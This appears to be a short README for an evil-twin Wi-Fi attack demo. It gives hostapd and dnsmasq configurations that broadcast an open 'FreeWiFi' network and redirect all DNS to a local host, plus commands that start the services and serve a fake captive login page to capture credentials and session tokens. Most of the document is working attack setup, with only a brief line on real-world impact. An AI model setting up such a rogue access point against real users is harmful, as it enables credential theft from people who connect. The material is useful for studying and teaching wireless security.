# 📡 Rogue Access Point (Evil Twin) – Wi-Fi Attack Demo

This simulation sets up a rogue Wi-Fi AP to impersonate a legitimate network and capture user credentials via a fake captive portal.

---

## 🧰 Tools Required

- `hostapd`
- `dnsmasq`
- `iptables`
- `nginx` or custom captive portal
- Kali Linux or any Linux distro

---

## ⚙️ Setup Steps

1. **Configure `hostapd.conf`:**

```bash
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
```
2. Configure dnsmasq.conf:

```bash
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,12h
address=/#/10.0.0.1
```

3. Start services:

```bash
sudo hostapd hostapd.conf
sudo dnsmasq -C dnsmasq.conf
```

4. Serve the fake login page:

```bash
sudo service nginx start
```

## 🔐 Real-World Impact

Users often connect to open Wi-Fi without verifying legitimacy. With DNS spoofing and fake portals, attackers can capture login credentials or session tokens.
